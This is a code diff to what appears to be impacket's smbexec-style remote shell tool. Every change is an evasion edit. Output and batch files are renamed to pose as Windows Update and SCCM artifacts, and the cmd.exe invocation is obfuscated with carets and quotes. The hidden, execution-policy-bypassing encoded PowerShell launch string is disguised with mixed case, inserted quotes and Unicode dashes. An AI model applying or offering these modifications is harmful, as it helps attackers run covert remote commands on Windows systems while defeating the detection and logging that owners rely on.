@@ -56,8 +56,8 @@ from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
-OUTPUT_FILENAME = '__output_' + ''.join([random.choice(string.ascii_letters) for i in range(8)])
-SMBSERVER_DIR   = '__tmp'
+OUTPUT_FILENAME = 'WindowsUpdate' + ''.join([random.choice(string.ascii_letters) for i in range(2)])
+SMBSERVER_DIR   = 'SCCMLogs'
 DUMMY_SHARE     = 'TMP'
 CODEC = sys.stdout.encoding
 
@@ -180,9 +180,9 @@ class RemoteShell(cmd.Cmd):
         self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
         self.__outputBuffer = b''
         self.__command = ''
-        self.__shell = '%COMSPEC% /Q /c '
+        self.__shell = 'c^md.exe ;"/"Q "@" ,/^c '
         self.__shell_type = shell_type
-        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
+        self.__pwsh = 'POWeRShELl.exe ―N"o"pRo -N"o"Lo -St -"n"onI"NTER"a"C" -w Hi"dd"en —E"XEc"ut B"y"p"a"s"s" —En"co"deD"COM" '
         self.__serviceName = serviceName
         self.__rpc = rpc
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute'
@@ -281,7 +281,7 @@ class RemoteShell(cmd.Cmd):
             data = '$ProgressPreference="SilentlyContinue";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
-        batchFile = '%SYSTEMROOT%\\' + ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.bat'
+        batchFile = 'C:\\%USER%\\AppData\\Local\\Temp\\' + 'WindowsUpdateScript' + ''.join([random.choice(string.ascii_letters) for _ in range(2)]) + '.cmd'
                 
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
                   self.__shell + batchFile
